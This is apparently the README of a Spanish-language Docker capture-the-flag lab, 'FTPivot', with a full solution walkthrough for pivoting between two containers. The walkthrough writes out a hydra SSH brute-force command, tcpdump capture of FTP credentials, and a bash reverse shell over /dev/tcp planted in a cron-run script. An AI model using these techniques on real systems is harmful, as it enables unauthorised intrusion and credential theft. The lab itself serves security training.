# FTPivot

## 1. Descripción General

Este laboratorio es una simulación de un entorno de red diseñado para practicar técnicas de análisis y penetración de sistemas. Utiliza Docker para simular dos servidores diferentes, cada uno con configuraciones específicas destinadas a desafiar al usuario a utilizar una variedad de herramientas y técnicas de ciberseguridad.

## 2. Instalación y Despliegue

Antes del despliegue de nuestro laboratorio será necesario craer una red en Docker de tipo _bridge_:

```bash
docker network create ftpivot
```

### 2.1. Despliegue automático

Para desplegar el laboratorio bastará con ejecutar:

```bash
docker run -d --name ftpivot1 --network ftpivot -p [HostPort]:22 kradbyte/ftpivot:pivot1
docker run -d --name ftpivot2 --network ftpivot kradbyte/ftpivot:pivot2
```

No olvides reemplazar `HostPort` por el puerto de tu host por donde expondrás el servicio SSH.

### 2.2. Despliegue manual

Para construir tus propias imágenes deberás clonar el repositorio y construir las imágenes:

```bash
git clone https://github.com/kradbyte/elemental-labs.git
docker build -t kradbyte/ftpivot:pivot1 -f elementals-labs/5-FTPivot/Dockerfile.a elementals-labs/5-FTPivot
docker build -t kradbyte/ftpivot:pivot2 -f elementals-labs/5-FTPivot/Dockerfile.b elementals-labs/5-FTPivot
```

Luego podremos desplegar los contenedores:

```bash
docker run -d --name ftpivot1 --network ftpivot -p [HostPort]:22 kradbyte/ftpivot:pivot1
docker run -d --name ftpivot2 --network ftpivot kradbyte/ftpivot:pivot2
```

No olvides reemplazar `HostPort` por el puerto de tu host por donde expondrás el servicio SSH.

> **Nota**: Se recomienda no cambiar el nombre de los contenedores, dado que para las conexiones internas se utilizan estos nombres para la resolución de DNS. En caso se quiera cambiar el nombre de los contenedores se tendrán que cambiar los nombres en los archivos de configuración de las máquinas.

## 3. Descripción de laboratorio

En este laboratorio, deberás infiltrarte en un servidor para capturar una flag. Utilizarás una combinación de habilidades adquiridas previamente, además de introducirte en el concepto de movimiento lateral.

**Concepts**
Pivoteo: Exploración de dispositivos, servicios o redes internas que no son accesibles directamente desde la red pública.
Movimiento Lateral: Una vez se tiene acceso a un dispositivo, consiste en utilizarlo para ganar acceso a otros dispositivos dentro de la misma red.

**Steps**
- Gana acceso al servidor con SSH.
- Busca información relevante sobre posibles conexiones a otros hosts dentro de la red interna.
- Monitorea el tráfico de red y gana acceso al nuevo host (reverse shell).
- Consigue la llave para la nueva conexión.
- Con el nuevo usuario compara las flags que encontraste dentro del host y descifra la flag del laboratorio.

**Tools**
Nmap, NetCat, scripting bash, tcpdump, WireShark, SSH, curl, FTP.

**Grants**
- Verificar logs de lo que se esté trabajando o cualquier carpeta/archivo que contenga lo que se esté trabajando (SSH, la flag, FTP, etc.).
- Verificar tareas programadas.
- Usuario para SSH “guest”.

**Resultado**
Al final de este laboratorio, deberás ser capaz de entender y ejecutar un ataque de movimiento lateral dentro de una red simulada, utilizando herramientas y técnicas comunes en la ciberseguridad. La flag capturada demostrará tu éxito en el uso combinado de estos métodos y herramientas.

## 4. Solución del Laboratorio

### 4.1. Cracking de Credenciales

Primero deberemos crackear las credenciales de la SSH para acceder al primer host. La descripción nos proporciona el usuario "guest", por lo que deberemos descubrir la contraseña. Podremos utilizar alguna herramienta como _hydra_:

```bash
hydra -L guest -p /ruta/a/tu/diccionario ssh://ServerIP:ServerPort
```

No olvides reemplazar `ServerIP` y `ServerPort` por la IP del servidor donde está montado el servidor y el puerto por el que corre el servicio, en caso de haberse configurado para exponer SSH en otro puerto distinto al 22.

### 4.2. Búsqueda de la flag

Una vez dentro del servidor podremos buscar la flag con algún comando como los siguientes:

```bash
find / -name \*flag\* -type d 2>/dev/null
find / -name \*flag\* -type f 2>/dev/null
```

Al encontrar la flag nos daremos cuenta que hay dos flag, uno "old" y un "new", por lo que deberemos comparar las flag, pero una flag solo se pude leer por otro usuario, por lo que deberemos buscar alguna forma de conseguir el acceso al otro usuario.

### 4.3. Recolección de información

Al buscar dentro del servidor y llegar a las tareas cron, observaremos un par de tareas que se ejecutan por el usuario que necesitamos, así que podremos intentar capturar las peticiones para ver si podemos encontrar algo en el tráfico de red.

### 4.4. Monitoreo de Tráfico FTP

Para monitorear el tráfico utilizaremos tcpdump:

```bash
tcpdump -i eth0 -w trafic.pcap
```

Una vez tengamos capturado el tráfico podremos compartirlo con nuestro host principal para analizarlo con WireShark. Se recomienda montar un servidor http simple con capacidad PUT/POST.
Una vez analizado el tráfico y filtramos por FTP encontraremos las credenciales y la IP de la otra máquina, por lo que podríamos conectarnos por FTP y ver qué podemos encontrar en la otra máquina.

### 4.5. Acceso FTP y Manipulación de Scripts

Cuando hayamos obtenido las credenciales del FTP en el paso anterior podremos conectarnos al servicio. Recuerda conectarte por FTP desde el servidor, dado que este servicio corre en la red interna del servidor y no estará accesible desde host principal.
Al ingresar y listar lo que hay en el directario donde estamos notaremos que hay un script que ejecuta scripts en una carpeta, por lo que podremos crear nuestro propio script y ganar acceso a la máquina. Se recomienda hacer un script para una reverse shell, pero se es libre de optar por el camino que se gusta, como trabajar con la forward shell, ejecución de binarios externos trasferidos por FTP, etc.

```bash
#!/bin/bash
bash >& /dev/tcp/ClientIP/ListenPort 0>&1
```

### 4.6. SSH y Descubrimiento de PassPhrase

Al buscar dentro de la máquina en el historial de comandos en el archivo `.bash_history`, encontraremos un comando para conexión por SSH al usuario que necesitamos para leer la otra flag y al buscar la ruta de la llave, podremos conectarnos también al nuevo usuario encontrado. El problema es que si intentamos conectarnos nos pedirá una PasPhrase que no tenemos y deberemos buscar.
Si buscamos en las tareas programadas del usuario encontraremos la PassPhrase que buscamos:

```bash
cat /home/user/.bash_history
crontab -l
```

### 4.5. Conversión Hexadecimal y Descubrimiento de la Flag

Cuando nos hayamos conectado por SSH al usuario que necesitábamos podremos leer la otra flag, ahora bastará con darle permisos de lectura a todos los usuarios para que podamos comparar las dos flag. La diferencia resultante será un archivo ".txt" en hexadecimal, por lo que bastará con convertir el texto hexadecimal a un archivo legible y habremos resuelto el laboratorio.
